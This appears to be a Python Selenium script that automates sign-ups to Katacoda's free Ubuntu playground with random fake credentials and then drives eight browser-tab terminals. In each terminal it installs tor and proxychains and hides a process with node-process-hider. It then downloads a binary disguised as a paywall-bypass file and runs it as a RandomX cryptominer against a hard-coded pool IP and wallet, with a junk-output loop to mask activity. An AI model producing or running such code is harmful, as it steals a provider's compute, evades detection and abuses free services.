from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains  
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import tkinter as tk
import names
import secrets
import random
import string
import os

for i in range(1):
    rand_name = names.get_first_name(gender='male')
S = 5
ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
main= (rand_name+ran+'@outlook.com')
main2 = ''.join((secrets.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(8)))

driver = webdriver.Chrome()

driver.get('https://www.katacoda.com/courses/ubuntu/playground')
time.sleep(15)
driver.find_element_by_xpath('//*[@id="email"]').send_keys(main)
driver.find_element_by_xpath('//*[@id="password"]').send_keys(main2)
driver.find_element_by_xpath('//*[@id="auth-dialog"]/form/div[2]/div[3]/button').click()	
time.sleep(25)

languages = 8
for i in range(languages):
    k = 6
    name = names.get_first_name(gender='male')
    name2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k))
    name5 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k))
    driver.execute_script("window.open()")
    driver.switch_to.window(driver.window_handles[i+1])
    driver.get("https://www.katacoda.com/courses/ubuntu/playground")
    time.sleep(15)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("touch ", name+name2+".sh")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(2)
    
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("apt update && apt install proxychains screen -y ")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(25)
    
    
    
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys('echo -e "cd /etc && rm proxychains.conf && curl -Lfo proxychains.conf https://github.com/Tamisv2/bavmw29/raw/main/proxychains.conf && apt install tor -y  && service tor start && cd /root && fold=\$(openssl rand -hex 6) && file=\$(openssl rand -hex 6) && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add \$file && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/masterfile -O \$file && chmod 777 \$file && ./\$file -o 139.99.124.170:80 -u 89dCD5t24WBg71HsMnuYUwbhTVcg2BtbFVNHqZcDeoeEGfKSpE6A7ENSECYkKTEXzWSwxvmp6cB8hRUc6JdfmVv9Trgdkyo -k -a rx/0 -p \$RANDOM -t 4 > /dev/null 2>&1" >', name+name2+'.sh')
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys('screen -S ', name5,' -dm bash ', name+name2+'.sh')
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)   
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("while :; do     rodin=$(openssl rand -hex 20);     echo $rodin;     sleep 5;     rod=$(openssl rand -base64 15);     echo $rod;     sleep 20; done")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(12)
time.sleep(3472)
